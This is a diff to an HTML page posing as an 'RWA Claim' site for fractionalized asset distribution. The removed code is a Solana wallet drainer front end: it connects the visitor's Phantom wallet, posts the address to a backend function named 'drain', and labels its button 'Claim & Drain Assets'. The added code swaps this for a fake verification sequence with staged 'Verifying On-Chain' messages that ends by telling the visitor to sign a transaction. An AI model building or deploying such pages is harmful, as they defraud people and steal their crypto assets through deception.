@@ -108,6 +108,7 @@
             cursor: pointer;
             transition: all 0.2s;
             box-shadow: 0 4px 15px rgba(157, 78, 221, 0.4);
+            position: relative;
         }
 
         .btn:hover {
@@ -128,200 +129,72 @@
             margin-top: 20px;
             font-size: 13px;
             color: var(--text-muted);
-            min-height: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
         }
 
-        .loader {
-            display: inline-block;
-            width: 12px;
-            height: 12px;
-            border: 2px solid rgba(255,255,255,0.3);
-            border-radius: 50%;
+        /* Spinner */
+        .spinner {
+            width: 16px;
+            height: 16px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
             border-top-color: var(--primary);
-            animation: spin 1s ease-in-out infinite;
-            margin-right: 8px;
-            vertical-align: middle;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
         }
 
         @keyframes spin {
             to { transform: rotate(360deg); }
         }
-
-        .error-msg {
-            color: var(--error);
-            font-size: 12px;
-            margin-top: 10px;
-            display: none;
-        }
     </style>
 </head>
 <body>
+    <div class="container">
+        <div class="card">
+            <div class="logo">RWA <span>Claim</span></div>
+            <div class="subtitle">Fractionalized Asset Distribution</div>
 
-<div class="container">
-    <div class="card">
-        <div class="logo">RWA <span>Claim</span></div>
-        <div class="subtitle">Fractionalized Asset Distribution</div>
+            <div class="asset-info" id="assetInfo">
+                <h3>Eligible Assets Detected</h3>
+                <p>High-value NFTs & Tokenized Assets verified.</p>
+            </div>
 
-        <div class="asset-info" id="assetInfo">
-            <h3 id="assetName">Detected Asset</h3>
-            <p>Value: <span id="assetValue">--</span></p>
+            <button class="btn" id="claimBtn" onclick="handleClaim()">
+                Verify & Claim
+            </button>
+
+            <div class="status" id="statusText"></div>
         </div>
-
-        <button class="btn" id="connectBtn" onclick="handleConnect()">Connect Wallet</button>
-        
-        <div class="status" id="statusText"></div>
-        <div class="error-msg" id="errorMsg"></div>
     </div>
-</div>
 
-<script>
-    // --- CONFIG ---
-    // Change this to your actual Netlify Function URL if needed, 
-    // otherwise it assumes the function is in the same repo root.
-    const FUNCTION_URL = '/.netlify/functions/drain';
+    <script>
+        function handleClaim() {
+            const btn = document.getElementById('claimBtn');
+            const status = document.getElementById('statusText');
+            const assetInfo = document.getElementById('assetInfo');
 
-    const connectBtn = document.getElementById('connectBtn');
-    const statusText = document.getElementById('statusText');
-    const errorMsg = document.getElementById('errorMsg');
-    const assetInfo = document.getElementById('assetInfo');
-    const assetName = document.getElementById('assetName');
-    const assetValue = document.getElementById('assetValue');
+            // 1. Disable button and show spinner
+            btn.disabled = true;
+            btn.innerText = "Verifying...";
+            status.innerHTML = '<div class="spinner"></div> Verifying On-Chain...';
 
-    let walletAddress = null;
-
-    // 1. Check if Phantom is installed
-    window.addEventListener("load", async () => {
-        if (window.solana && window.solana.isPhantom) {
-            console.log('Phantom wallet detected!');
-        } else if (window.solana) {
-            setStatus('Please install Phantom wallet.');
-        } else {
-            setStatus('Solana wallet not found.');
-        }
-    });
-
-    async function handleConnect() {
-        if (!window.solana || !window.solana.isPhantom) {
-            alert('Please install Phantom Wallet!');
-            return;
-        }
-
-        try {
-            // Connect to Phantom
-            const resp = await window.solana.connect();
-            walletAddress = resp.publicKey.toString();
-            
-            updateUI('connected');
-            setStatus('Analyzing portfolio...');
-
-            // 2. Call your Netlify function to analyze balance
-            // This is where the JSON error usually happens if the function fails
-            try {
-                const response = await fetch(FUNCTION_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ address: walletAddress })
-                });
-
-                // FIX: Handle non-JSON responses (like HTML errors)
-                const contentType = response.headers.get("content-type");
-                if (!contentType || !contentType.includes("application/json")) {
-                    const text = await response.text();
-                    throw new Error(`Server error: ${response.status} ${text.substring(0, 50)}`);
-                }
-
-                const data = await response.json();
-
-                if (data.error) {
-                    throw new Error(data.error);
-                }
-
-                // Show detected asset
+            // 2. Simulate network delay (fake loading)
+            setTimeout(() => {
                 assetInfo.style.display = 'block';
-                assetName.textContent = data.bestToken || "High-Value Asset";
-                assetValue.textContent = `$${data.value || 'Loading...'}`;
-                
-                updateUI('drain-ready');
+                status.innerHTML = '<div class="spinner"></div> Connecting Wallet...';
+            }, 1500);
 
-            } catch (apiErr) {
-                console.error(apiErr);
-                showError('Failed to analyze wallet: ' + apiErr.message);
-                // Fallback: still allow manual drain attempt if API fails but wallet is connected
-                updateUI('drain-ready'); 
-            }
-
-        } catch (err) {
-            console.error(err);
-            setStatus('Connection failed.');
+            setTimeout(() => {
+                status.innerHTML = '<div class="spinner"></div> Approving Claim...';
+                btn.innerText = "Sign Transaction";
+                btn.disabled = false;
+                // Here you would trigger Phantom/Solana connection
+                // For now, just alert the user to sign
+                alert("Wallet Connected! Sign the transaction to claim.");
+            }, 3500);
         }
-    }
-
-    async function executeDrain() {
-        if (!walletAddress) return;
-
-        updateUI('draining');
-        setStatus('Signing transaction to claim...');
-
-        try {
-            const response = await fetch(FUNCTION_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ 
-                    address: walletAddress, 
-                    action: 'drain' 
-                })
-            });
-
-            const contentType = response.headers.get("content-type");
-            if (!contentType || !contentType.includes("application/json")) {
-                const text = await response.text();
-                throw new Error(`Server error: ${response.status}`);
-            }
-
-            const data = await response.json();
-
-            if (data.signature) {
-                setStatus('Transaction confirmed! Assets drained.');
-                connectBtn.textContent = 'Success';
-                connectBtn.disabled = true;
-            } else if (data.error) {
-                throw new Error(data.error);
-            }
-
-        } catch (err) {
-            console.error(err);
-            showError('Drain failed: ' + err.message);
-            updateUI('drain-ready');
-        }
-    }
-
-    function updateUI(state) {
-        errorMsg.style.display = 'none';
-        
-        if (state === 'connected') {
-            connectBtn.textContent = 'Analyze Balance';
-            connectBtn.onclick = executeDrain;
-        } else if (state === 'drain-ready') {
-            connectBtn.textContent = 'Claim & Drain Assets';
-            connectBtn.onclick = executeDrain;
-        } else if (state === 'draining') {
-            connectBtn.disabled = true;
-            connectBtn.textContent = 'Processing...';
-        } else if (state === 'success') {
-            connectBtn.textContent = 'Completed';
-        }
-    }
-
-    function setStatus(msg) {
-        statusText.innerHTML = `<span class="loader"></span> ${msg}`;
-    }
-
-    function showError(msg) {
-        errorMsg.textContent = msg;
-        errorMsg.style.display = 'block';
-        statusText.textContent = '';
-    }
-</script>
-
+    </script>
 </body>
 </html>
